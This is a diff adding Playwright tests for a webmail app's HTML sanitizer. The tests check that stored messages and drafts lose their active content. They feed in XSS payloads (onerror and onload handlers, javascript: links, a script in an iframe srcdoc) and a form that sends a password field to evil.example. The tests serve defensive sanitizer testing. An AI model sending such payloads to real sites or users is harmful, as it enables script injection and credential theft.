@@ -47,6 +47,79 @@ test("renders HTML in a sandboxed frame and holds remote images until asked", as
 	await expect.poll(() => imageRequests).toBeGreaterThan(0);
 });
 
+test("stores received HTML without active content and the reader keeps it inert", async ({ page }) => {
+	const api = await apiContext(STORAGE_STATE);
+	const subject = `Hostile ${uniqueToken()}`;
+	const stored = await deliverInbound(api, {
+		from: `"Hostile Sender" <hostile@outside.test>`,
+		to: SUPPORT_ADDRESS,
+		subject,
+		html: [
+			'<p class="lead">Visible <b>text</b></p>',
+			'<img src="x" onerror="window.parent.__pwned = true" alt="broken">',
+			'<a href="javascript:window.parent.__pwned = true">Click me</a>',
+			'<iframe srcdoc="<script>parent.parent.__pwned = true</script>"></iframe>',
+			'<form action="https://evil.example/steal"><input name="password"></form>',
+			'<svg onload="window.parent.__pwned = true"></svg>',
+		].join(""),
+	});
+	const detail = (await (await api.get(`/api/messages/${stored.id}`)).json()) as { body: { htmlBody: string } };
+	await api.dispose();
+	const htmlBody = detail.body.htmlBody;
+	expect(htmlBody).toContain('<p class="lead">Visible <b>text</b></p>');
+	expect(htmlBody).toContain("Click me");
+	expect(htmlBody).not.toMatch(/onerror|onload|javascript:|<iframe|<form|<input|<svg|<script/i);
+
+	await page.goto("/inbox");
+	await openMessage(page, subject);
+	const body = page.frameLocator('iframe[title="Message body"]');
+	await expect(body.getByText("Visible")).toBeVisible();
+	await expect(body.getByText("Click me")).not.toHaveAttribute("href");
+	await expect(body.locator("iframe, form, input, svg")).toHaveCount(0);
+	expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
+});
+
+test("a draft written outside the composer is sanitized before the editor renders it", async ({ page }) => {
+	const api = await apiContext(STORAGE_STATE);
+	const { mailboxes } = (await (await api.get("/api/mailboxes")).json()) as {
+		mailboxes: { id: string; localPart: string; hostname: string }[];
+	};
+	const mailbox = mailboxes.find((item) => `${item.localPart}@${item.hostname}` === SUPPORT_ADDRESS);
+	expect(mailbox, SUPPORT_ADDRESS).toBeDefined();
+	const subject = `Hostile draft ${uniqueToken()}`;
+	const created = await api.post("/api/drafts", {
+		data: {
+			mailboxId: mailbox!.id,
+			from: SUPPORT_ADDRESS,
+			to: "someone@outside.test",
+			subject,
+			html: [
+				'<p>Draft <b>body</b></p><img src="/missing.png" onerror="window.__pwned = true"><a href="javascript:window.__pwned = true">link</a>',
+				'<div class="kite-quote" data-kite-quote="1">',
+				'<p>Quoted <b>content</b></p><img src="/missing.png" onerror="window.__pwned = true"><a href="javascript:window.__pwned = true">quoted link</a>',
+				"</div>",
+			].join(""),
+		},
+	});
+	expect(created.ok(), await created.text()).toBe(true);
+	const { draft } = (await created.json()) as { draft: { id: string } };
+	await api.dispose();
+
+	await page.goto(`/drafts/${draft.id}`);
+	const editor = page.getByRole("textbox", { name: "Message body" });
+	await expect(editor.getByText("body")).toBeVisible();
+	await expect(editor.locator("img")).toHaveCount(0);
+	await expect(editor.getByText("link", { exact: true })).not.toHaveAttribute("href");
+	// The folded quote is rendered separately from the editable body, so it needs its own check.
+	await page.getByTitle("Show quoted text").click();
+	const quoted = page.locator("div.email-body").filter({ hasText: "Quoted" });
+	await expect(quoted.getByText("content")).toBeVisible();
+	await expect(quoted.locator("img")).toHaveCount(0);
+	await expect(quoted.getByText("quoted link")).not.toHaveAttribute("href");
+	// Development pages allow inline handlers, so an unsanitized onerror would have run by now.
+	expect(await page.evaluate(() => (window as unknown as { __pwned?: boolean }).__pwned)).toBeUndefined();
+});
+
 for (const theme of ["light", "dark"]) {
 	test(`in ${theme} mode the message frame is transparent and shows the whole message`, async ({ page }) => {
 		const api = await apiContext(STORAGE_STATE);
